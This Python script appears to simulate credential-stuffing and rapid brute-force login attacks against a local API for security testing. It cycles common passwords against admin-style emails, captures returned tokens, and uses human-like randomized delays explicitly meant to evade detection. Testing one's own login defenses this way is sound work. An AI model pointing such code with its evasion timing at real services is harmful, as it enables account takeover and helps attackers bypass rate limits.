#!/usr/bin/env python3
"""
Brute Force Login Attack Simulation
Tests credential stuffing and rapid login attempts
Now with realistic evasion techniques
"""

import time
import random
from faker import Faker
from attack_utils import RealisticAttacker

fake = Faker()
BASE_URL = "http://localhost:3001"
attacker = RealisticAttacker(BASE_URL)

# Common passwords for credential stuffing
COMMON_PASSWORDS = [
    "password", "123456", "password123", "admin", "12345678",
    "qwerty", "abc123", "monkey", "1234567", "letmein",
    "trustno1", "dragon", "baseball", "iloveyou", "master",
    "sunshine", "ashley", "bailey", "passw0rd", "shadow"
]

# Common email patterns
EMAIL_PATTERNS = [
    "admin@example.com", "test@test.com", "user@user.com",
    "admin@admin.com", "root@localhost", "test@example.com"
]

def brute_force_login():
    """Simulate credential stuffing attack with realistic behavior"""
    print("🔓 Starting Brute Force Login Attack...")
    print(f"Target: {BASE_URL}/api/auth/login")
    print(f"User Agent: {attacker.user_agent[:60]}...\n")
    
    attack_count = 0
    success_count = 0
    
    for email in EMAIL_PATTERNS:
        for password in COMMON_PASSWORDS[:5]:
            try:
                # Use smart_request with retry logic and evasion
                response = attacker.smart_request(
                    method="POST",
                    endpoint="/api/auth/login",
                    json_data={"email": email, "password": password},
                    retries=2
                )
                
                if response is None:
                    continue
                
                attack_count += 1
                
                if response.status_code == 200:
                    success_count += 1
                    print(f"✅ SUCCESS: {email}:{password}")
                    print(f"   Token: {response.json().get('token', 'N/A')[:50]}...")
                    attacker.log_attack("login", True, {"email": email, "password": password})
                else:
                    print(f"❌ Failed: {email}:{password} - Status: {response.status_code}")
                    attacker.log_attack("login", False, {"email": email})
                
                # Human-like delay is already in smart_request
                
            except Exception as e:
                print(f"Error: {e}")
                attack_count += 1
    
    summary = attacker.get_attack_summary()
    print(f"\n📊 Attack Summary:")
    print(f"   Total attempts: {attack_count}")
    print(f"   Successful logins: {success_count}")
    print(f"   Success rate: {(success_count/max(1, attack_count))*100:.2f}%")
    print(f"   Requests blocked: {attacker.blocked_count}")
    print(f"   Overall stat: {summary['success_rate']}")

def rapid_login_attempts():
    """Simulate rapid login attempts with detection evasion"""
    print("\n⚡ Starting Rapid Login Attempts...")
    print(f"Simulating distributed attack pattern...\n")
    
    email = fake.email()
    attempts = 20
    success_count = 0
    
    for i in range(attempts):
        try:
            response = attacker.smart_request(
                method="POST",
                endpoint="/api/auth/login",
                json_data={"email": email, "password": fake.password()},
                retries=1
            )
            
            if response is None:
                print(f"Attempt {i+1}/{attempts}: Connection failed")
                continue
            
            print(f"Attempt {i+1}/{attempts}: Status {response.status_code}")
            if response.status_code == 200:
                success_count += 1
            
            # Varied delays to avoid pattern detection
            attacker.human_like_delay(min_delay=0.2, max_delay=1.5)
            
        except Exception as e:
            print(f"Error on attempt {i+1}: {e}")
    
    print(f"\n⚡ Rapid Attack Completed")
    print(f"   Total attempts: {attempts}")
    print(f"   Successful: {success_count}")
    print(f"   Blocked: {attacker.blocked_count}")
    
    attacker.log_attack("rapid_login", success_count > 0, {"attempts": attempts})
    attacker.save_attack_log("brute_force_log.json")

if __name__ == "__main__":
    brute_force_login()
    rapid_login_attempts()
    attacker.save_attack_log("brute_force_log.json")
